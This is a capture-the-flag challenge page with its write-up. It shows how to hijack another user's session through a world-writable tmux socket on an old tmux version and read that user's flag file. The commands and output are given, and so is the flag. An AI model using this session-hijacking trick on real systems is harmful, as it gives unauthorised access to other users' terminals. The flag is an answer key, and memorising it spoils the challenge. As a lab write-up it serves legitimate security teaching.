# Movie Night #1

### Category

System

### Difficulty

Very Easy

### Author

Log_s

### Description

*Dallas*: Something has attached itself to him. We have to get him to the infirmary right away.

*Ripley*: What kind of thing? I need a clear definition.

\- ***Alien (1979)***

===

The flag for this challenge is located at `/home/dev/flag.txt`.

Your credentials are: `user:password`.

DEPLOY: [https://deploy.heroctf.fr](https://deploy.heroctf.fr)

### Write Up

In this challenge, we need to find the flag in the `dev` user's home directory.

We notice there is a tmux socket file in `/tmp` that is writable by anyone.
```
user@movie-night:/tmp$ ls -la /tmp
total 12
drwxrwxrwt 1 root root 4096 Oct 26 16:27 .
drwxr-xr-x 1 root root 4096 Oct 26 15:39 ..
-rw-r--r-- 1 root root 1023 Oct 26 16:27 procedure-processing-service.log
srw-rw-rw- 1 dev  dev     0 Oct 26 16:27 tmux-1002
```

Tmux is a terminal multiplexer that allows you to create multiple sessions in a single terminal. One of it's features is to create a socket file in a temporary directory that can be used to attach to a session.

ACL based tmux session hijacking mitigations have been introduced in tmux 3.3: [tmux 3.3 release notes](https://raw.githubusercontent.com/tmux/tmux/3.3/CHANGES)

However, our current version is 3.0a, which can still be very easily exploited in the current context.
```
user@movie-night:/tmp$ tmux -V
tmux 3.0a
```

We only need to attach to the tmux session through the exposed socket file.
```
user@movie-night:/tmp$ tmux -S /tmp/tmux-1002
```
We are now attached to the tmux session as the `dev` user.
```
dev@movie-night:/tmp$ whoami
dev
dev@movie-night:/tmp$ cat /home/dev/flag.txt
Hero{1s_1t_tmux_0r_4l13n?_a20bac4b5aa32e8d9a8ccb75d228ca3e}
```

### Flag

Hero{1s_1t_tmux_0r_4l13n?_a20bac4b5aa32e8d9a8ccb75d228ca3e}
